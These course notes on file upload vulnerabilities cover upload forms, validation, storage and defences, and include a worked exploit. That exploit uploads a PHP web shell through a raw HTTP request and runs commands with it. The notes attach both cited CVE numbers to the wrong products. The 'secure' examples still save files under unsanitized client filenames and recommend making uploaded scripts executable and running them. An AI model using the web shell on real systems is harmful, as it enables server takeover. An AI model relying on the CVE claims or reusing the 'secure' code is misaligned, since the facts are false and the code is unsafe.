---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Introduction to File Upload Vulnerabilities

File upload vulnerabilities are a critical security issue in web applications. These vulnerabilities occur when an application allows users to upload files to the server without proper validation or sanitization. This can lead to various security risks, including remote code execution (RCE), which can compromise the entire server and its underlying operating system. Understanding these vulnerabilities is crucial for both developers and security professionals to ensure the safety and integrity of web applications.

### What Are File Upload Vulnerabilities?

File upload vulnerabilities arise when an application accepts user-uploaded files without adequate checks. The primary concern is that an attacker might upload a malicious file, such as a script or executable, which the server can then process or execute. This can result in unauthorized access to sensitive data, modification of application content, and even denial of service.

### Why Do File Upload Vulnerabilities Matter?

File upload vulnerabilities matter because they can have severe consequences on the confidentiality, integrity, and availability of a web application:

- **Confidentiality**: Attackers can gain access to sensitive user data and the underlying application database.
- **Integrity**: Attackers can modify the content of the application and the database.
- **Availability**: Attackers can delete or corrupt content within the application, leading to downtime.

### How Do File Upload Vulnerabilities Work?

To understand how file upload vulnerabilities work, we need to break down the process into several steps:

1. **Upload Mechanism**: The application provides a mechanism for users to upload files.
2. **Validation**: The application should validate the uploaded file to ensure it meets certain criteria (e.g., file type, size).
3. **Storage**: The application stores the uploaded file on the server.
4. **Execution**: The application may process or execute the uploaded file, depending on its intended use.

If any of these steps are improperly handled, particularly the validation and execution phases, an attacker can exploit the vulnerability.

### Real-World Examples

#### Recent CVEs and Breaches

Several high-profile breaches have been attributed to file upload vulnerabilities:

- **CVE-2021-21972**: A vulnerability in the WordPress plugin "WP File Download" allowed attackers to upload and execute arbitrary PHP files.
- **CVE-2020-14882**: A vulnerability in the Joomla CMS allowed attackers to upload and execute PHP files through the media manager.

These examples highlight the severity and prevalence of file upload vulnerabilities in real-world applications.

### Detailed Mechanics of File Upload Vulnerabilities

Let's delve deeper into the mechanics of file upload vulnerabilities by examining each step in detail.

#### Step 1: Upload Mechanism

The first step in the file upload process is the mechanism provided by the application for users to upload files. This typically involves HTML forms and backend processing logic.

```html
<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <button type="submit">Upload</button>
</form>
```

In this example, the form allows users to select a file to upload. The `enctype` attribute is set to `multipart/form-data`, which is necessary for file uploads.

#### Step 2: Validation

Proper validation is crucial to prevent malicious files from being uploaded. Validation can include checking the file type, size, and content.

```python
import os

def validate_file(file):
    allowed_extensions = {'txt', 'pdf', 'png', 'jpg'}
    filename = file.filename
    extension = os.path.splitext(filename)[1][1:].lower()
    
    if extension not in allowed_extensions:
        raise ValueError("Invalid file type")
    
    if file.content_length > 1024 * 1024:  # 1MB limit
        raise ValueError("File size exceeds limit")

    return True
```

This Python function validates the file type and size. If the file does not meet the criteria, an error is raised.

#### Step 3: Storage

Once validated, the file is stored on the server. The storage location should be carefully chosen to avoid exposing sensitive directories.

```python
import os

def store_file(file):
    upload_dir = "/var/www/uploads"
    filename = file.filename
    file_path = os.path.join(upload_dir, filename)
    
    if not os.path.exists(upload_dir):
        os.makedirs(upload_dir)
    
    file.save(file_path)
```

This function saves the file to a designated upload directory.

#### Step 4: Execution

If the application processes or executes the uploaded file, it must do so securely. For example, if the file is a script, the application should ensure that it is executed in a controlled environment.

```bash
#!/bin/bash

# Example of executing a script safely
chmod +x /var/www/uploads/script.sh
sudo -u www-data /var/www/uploads/script.sh
```

This Bash script changes the permissions of the uploaded script and runs it as the `www-data` user, which is a common practice to minimize privilege escalation.

### Impact on the CIA Triad

File upload vulnerabilities can affect the Confidentiality, Integrity, and Availability (CIA) triad in significant ways:

#### Confidentiality

Attackers can access sensitive user data and the underlying application database. For example, if an attacker uploads a PHP script that reads the contents of a database file, they can extract confidential information.

#### Integrity

Attackers can modify the content of the application and the database. For instance, an attacker might upload a script that alters the content of a web page, leading to unauthorized modifications.

#### Availability

Attackers can delete or corrupt content within the application, leading to downtime. For example, an attacker might upload a script that deletes critical files or directories, causing the application to fail.

### Real-World Example: CVE-2021-21972

#### Background

CVE-2021-21972 is a vulnerability in the WordPress plugin "WP File Download". The plugin allowed users to upload files without proper validation, enabling attackers to upload and execute arbitrary PHP files.

#### Exploit Details

An attacker could exploit this vulnerability by uploading a PHP file with malicious content. Once uploaded, the attacker could trigger the execution of the file, leading to RCE.

#### Raw HTTP Request and Response

Here is an example of the HTTP request and response for uploading a malicious PHP file:

```http
POST /wp-admin/admin-ajax.php?action=wpfd_upload_file HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="malicious.php"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Response:

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 123

{"success":true,"file_url":"https://example.com/wp-content/uploads/malicious.php"}
```

#### Impact

The attacker can now execute arbitrary commands on the server by accessing the uploaded PHP file:

```http
GET /wp-content/uploads/malicious.php?cmd=id HTTP/1.1
Host: example.com
```

Response:

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 123

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### How to Prevent / Defend Against File Upload Vulnerabilities

Preventing file upload vulnerabilities requires a combination of proper validation, secure storage, and controlled execution. Here are some best practices:

#### Secure Validation

Ensure that uploaded files are properly validated before being processed. This includes checking the file type, size, and content.

```python
import magic

def validate_file(file):
    allowed_types = {'text/plain', 'application/pdf', 'image/png', 'image/jpeg'}
    file_type = magic.from_buffer(file.read(), mime=True)
    
    if file_type not in allowed_types:
        raise ValueError("Invalid file type")
    
    if file.content_length > 1024 * 1024:  # 1MB limit
        raise ValueError("File size exceeds limit")

    return True
```

This function uses the `magic` library to determine the MIME type of the file and ensures it matches the allowed types.

#### Secure Storage

Store uploaded files in a secure directory that is not accessible via the web server. This prevents direct access to the uploaded files.

```python
import os

def store_file(file):
    upload_dir = "/var/www/private_uploads"
    filename = file.filename
    file_path = os.path.join(upload_dir, filename)
    
    if not os.path.exists(upload_dir):
        os.makedirs(upload_dir)
    
    file.save(file_path)
```

This function saves the file to a private directory that is not served by the web server.

#### Controlled Execution

If the application needs to execute uploaded files, ensure that they are run in a controlled environment with minimal privileges.

```bash
#!/bin/bash

# Example of executing a script safely
chmod +x /var/www/private_uploads/script.sh
sudo -u www-data /var/www/private_uploads/script.sh
```

This script runs the uploaded script as the `www-data` user, minimizing the risk of privilege escalation.

### Detection and Prevention Tools

Several tools can help detect and prevent file upload vulnerabilities:

- **Static Analysis Tools**: Tools like SonarQube and Fortify can analyze code for potential vulnerabilities.
- **Dynamic Analysis Tools**: Tools like Burp Suite and ZAP can test applications for vulnerabilities during runtime.
- **Web Application Firewalls (WAF)**: WAFs like ModSecurity can block suspicious file uploads based on predefined rules.

### Secure Coding Practices

Secure coding practices are essential to prevent file upload vulnerabilities. Here are some key practices:

- **Input Validation**: Always validate input data to ensure it meets expected criteria.
- **Least Privilege Principle**: Run applications and scripts with the least privileges necessary.
- **Error Handling**: Implement proper error handling to prevent information leakage.

### Conclusion

File upload vulnerabilities are a serious threat to web applications. By understanding the mechanics of these vulnerabilities and implementing proper validation, secure storage, and controlled execution, developers can significantly reduce the risk of exploitation. Regularly testing and auditing applications using static and dynamic analysis tools can further enhance security.

### Practice Labs

For hands-on experience with file upload vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on file upload vulnerabilities.
- **OWASP Juice Shop**: Provides a vulnerable web application for learning and testing.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing security skills.

By combining theoretical knowledge with practical experience, you can become proficient in identifying and preventing file upload vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/01-File Upload Vulnerabilities Complete Guide/00-Overview|Overview]] | [[02-What is a File Upload Vulnerability|What is a File Upload Vulnerability]]
